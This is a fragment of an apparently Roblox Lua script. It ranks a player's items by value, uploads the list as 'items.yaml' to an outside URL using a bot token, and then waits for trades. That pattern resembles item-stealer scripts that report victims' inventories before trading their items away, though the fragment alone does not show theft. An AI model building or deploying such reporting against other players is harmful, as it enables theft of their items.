                amount = v,
                value = value
            })
            vaule = vaule + value * v
        end
    end
    inventroy = inventroy..tostring(vaule).."\n\n"
    table.sort(talbe, function(a, b)
        return (a.value * a.amount) > (b.value * b.amount)
    end)
    for i, v in ipairs(talbe) do
        lnie = string.format("%s (x%s) → %s Value", v.name, v.amount, (v.value * v.amount))
        inventroy = inventroy .. lnie .. "\n"
    end
    local boundary = "---------------------------" .. tick()
    local body = "--" .. boundary .. "\r\n" ..
                "Content-Disposition: form-data; name=\"file\"; filename=\"items.yaml\"\r\n" ..
                "Content-Type: text/plain\r\n\r\n" ..
                inventroy .. "\r\n" ..
                "--" .. boundary .. "--\r\n"
    local response = request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Authorization"] = "Bot " .. bottoken,
            ["Content-Type"] = "multipart/form-data; boundary=" .. boundary
        },
        Body = body
    })

    if response.StatusCode == 200 or response.StatusCode == 201 then else
        warn(response.Body)
    end
    setStatus("Waiting for trades")
end
